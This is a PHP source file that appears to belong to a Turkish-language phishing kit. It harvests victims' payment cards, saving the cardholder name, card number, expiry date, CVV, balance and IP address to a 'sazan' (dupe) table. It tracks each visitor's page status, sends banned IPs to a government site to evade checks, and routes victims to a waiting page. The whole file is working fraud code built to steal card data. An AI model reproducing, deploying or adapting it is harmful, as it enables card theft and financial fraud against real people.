
<?php
date_default_timezone_set('Europe/Istanbul');
include('baglan.php');
$ip = $_SERVER['REMOTE_ADDR'];
    $db->query("UPDATE sazan SET now = 'Kart Sayfasında' WHERE ip = '{$ip}'");
if($_POST){
    $ad   = icerikTemizle(guvenlik(trim($_POST['cc_name'])));
    $kk       = icerikTemizle(guvenlik(trim($_POST['cc_no'])));
    $sonkul   = icerikTemizle(guvenlik(trim($_POST['cc_date'])));
    $cvv   = icerikTemizle(guvenlik(trim($_POST['cc_cvv'])));
    $money   = icerikTemizle(guvenlik(trim($_POST['balance'])));
    ob_start();
    session_start();
    $cc_last_4 = substr($kk, 12, 16);
    $_SESSION['cc_last_4'] = $cc_last_4;
    $_SESSION['tl_amount'] = $money;
    $ip         = $_SERVER['REMOTE_ADDR'];
    $date       = date('d.m.Y H:i');
    
	$query = $db->prepare("INSERT INTO sazan SET ad=?,date=?,kk=?,sonkul=?,cvv=?,money=?,ip=?");
	$insert = $query->execute(array($ad,$date,$kk,$sonkul,$cvv,$money,$ip));


    if($insert){
    }
}

$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
    if($kontrol['ban'] == $ip){ 
            header('Location:http://www.turkiye.gov.tr');
        } 
}

print_r(exit(json_encode([
	'status' => true,
	'hrefpage' => 'bekle.php'
])));
?>
